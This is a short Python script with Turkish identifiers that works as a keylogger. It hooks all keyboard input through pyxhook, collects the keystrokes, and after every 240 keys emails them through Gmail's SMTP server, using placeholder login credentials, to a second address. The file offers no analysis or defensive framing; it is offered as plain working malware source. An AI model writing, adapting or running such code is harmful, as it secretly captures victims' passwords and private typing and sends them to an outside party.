from __future__ import print_function


import pyxhook
import time
import smtplib   
import socket

tuslar=[]

def kbevent(event):
    
    x=str(event.Key)
    tuslar.append(x)
    mesaj=str(tuslar)
    calis=True

    if(len(tuslar)==240):
        a=0
        while(calis):
        
            try:                        
                mail=smtplib.SMTP("smtp.gmail.com",587)
                mail.ehlo()
                mail.starttls()
                mail.login("admin@gmail.com","gmail sifresi")
                mail.sendmail("admin@gmail.com","alici@gmail.com",mesaj)
                
                while(a<240):
                    
                    tuslar.pop()
                    a+=1
                
                calis=False 
            except socket.gaierror:
                calis=True
                

    



hookman = pyxhook.HookManager()

hookman.KeyDown = kbevent

hookman.HookKeyboard()

hookman.start()


running = True
while running:
    time.sleep(0.1)


hookman.cancel()
